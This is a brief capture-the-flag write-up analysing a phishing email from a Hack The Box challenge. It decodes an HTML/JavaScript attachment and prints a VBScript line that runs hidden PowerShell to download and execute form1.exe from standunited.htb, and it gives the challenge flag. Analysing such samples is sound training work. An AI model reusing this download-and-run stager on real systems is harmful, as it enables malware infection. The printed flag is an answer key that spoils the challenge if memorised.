# ANALYSIS

Step 1 : Urgent Faction Recruitment Opportunity - Join Forces Against KORP™ Tyranny.eml : last par of the eml is base64 decoded

```
<html>
<head>
<title></title>
<body>
<script language="JavaScript" type="text/javascript">
document.write(unescape('%3c%68%74%6d%6c%3e%0.......
```

We find an HTML file with javascript, ....and it uses the unescape function to decode a string that has been encoded in hexadecimal


Step 2 : the HEXA code is decoded from HEX....
There is some fake vbscript and the flag in it 

```
	Set Process = Service.Get("Win32_Process")
	Error = Process.Create("cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://standunited.htb/online/forms/form1.exe','%appdata%\form1.exe');Start-Process '%appdata%\form1.exe';$flag='HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}", null, objConfig, intProcessID)
	window.close()
```




# FLAG

HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}